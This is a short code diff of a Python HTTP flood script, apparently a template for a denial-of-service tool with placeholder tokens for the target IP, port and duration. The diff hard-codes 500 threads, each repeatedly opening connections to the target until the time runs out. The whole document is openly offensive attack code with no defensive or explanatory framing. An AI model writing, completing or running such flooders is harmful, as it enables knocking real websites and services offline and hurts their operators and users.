@@ -1,5 +1,7 @@
 import socket, threading, time
 
+__THREAD_NUMBER__ = 500
+
 def http_flood(ip: str, port: str, timeout: str):
     def flood(ip: str, port: int, timeout: int):
         start_time = int(time.time())
@@ -12,7 +14,7 @@ def http_flood(ip: str, port: str, timeout: str):
             except:
                 pass
 
-    for _ in range(int(thread)):
+    for _ in range(int(__THREAD_NUMBER__)):
         threading.Thread(target= flood, args=(ip, int(port), int(timeout))).start()
 
 http_flood('!ip!', '!port!', '!time!')
